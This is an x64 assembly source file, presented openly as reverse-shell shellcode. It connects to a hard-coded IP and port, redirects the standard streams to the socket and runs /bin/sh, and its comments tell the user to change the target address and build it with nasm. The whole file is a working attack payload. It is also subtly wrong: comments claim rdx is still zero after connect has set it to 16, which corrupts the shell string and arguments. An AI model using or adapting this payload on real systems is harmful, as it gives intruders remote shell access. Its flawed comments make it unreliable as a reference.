; Position-independent x64 reverse shell shellcode
; Connects back to specified IP:PORT
; Usage: nasm -f elf64 reverse_shell.asm && ld reverse_shell.o -o reverse_shell

BITS 64

section .text
    global _start

_start:
    ; Clear registers to avoid null bytes
    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    xor rdx, rdx
    
    ; Create socket
    ; int socket(int domain, int type, int protocol)
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    ; AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0
    push 2      ; AF_INET
    pop rdi
    push 1      ; SOCK_STREAM
    pop rsi
    ; rdx already 0 for protocol
    push 41     ; socket syscall number
    pop rax
    syscall
    
    ; Save socket file descriptor in r15
    mov r15, rax
    
    ; Setup sockaddr_in structure on stack
    ; struct sockaddr_in {
    ;   sa_family_t sin_family;     // AF_INET (2)
    ;   in_port_t sin_port;         // Port in network byte order
    ;   struct in_addr sin_addr;    // IP address
    ;   char sin_zero[8];           // Padding
    ; }
    
    ; Build structure on stack (in reverse)
    push rdx                ; padding with rdx = 0
    
    ; IP address - Change to target IP (example: 192.168.1.10 = 0xc0a8010a)
    mov dword [rsp-4], 0x0a01a8c0  ; 192.168.1.10 in network byte order
    sub rsp, 4
    
    ; Port number - Change to target port (example: 4444 = 0x115c)
    mov word [rsp-2], 0x5c11       ; Port 4444 in network byte order (htons(4444))
    sub rsp, 2
    
    ; Address family
    mov word [rsp-2], 0x2          ; AF_INET (2)
    sub rsp, 2
    
    ; Connect
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
    mov rdi, r15            ; Socket descriptor
    mov rsi, rsp            ; Pointer to sockaddr_in structure
    push 16                 ; sizeof(sockaddr_in) = 16
    pop rdx
    push 42                 ; connect syscall number
    pop rax
    syscall
    
    ; Duplicate file descriptors
    ; dup2(sockfd, stdin/stdout/stderr)
    mov rdi, r15            ; Socket descriptor
    xor rsi, rsi            ; 0 - stdin
    push 33                 ; dup2 syscall number
    pop rax
    syscall
    
    mov rdi, r15            ; Socket descriptor
    push 1                  ; 1 - stdout
    pop rsi
    push 33                 ; dup2 syscall number
    pop rax
    syscall
    
    mov rdi, r15            ; Socket descriptor
    push 2                  ; 2 - stderr
    pop rsi
    push 33                 ; dup2 syscall number
    pop rax
    syscall
    
    ; Execute shell
    ; execve("/bin/sh", NULL, NULL)
    push rdx                ; NULL terminator (rdx is still 0)
    mov rbx, 0x68732f2f6e69622f ; "/bin//sh" in hex
    push rbx
    mov rdi, rsp            ; Pointer to "/bin//sh"
    push rdx                ; NULL terminator for argv[]
    mov rsi, rsp            ; argv = ["/bin//sh", NULL]
    ; rdx already 0 for envp = NULL
    push 59                 ; execve syscall number
    pop rax
    syscall
    
    ; Exit (unlikely to be reached)
    push 60                 ; exit syscall number
    pop rax
    xor rdi, rdi            ; Exit code 0
    syscall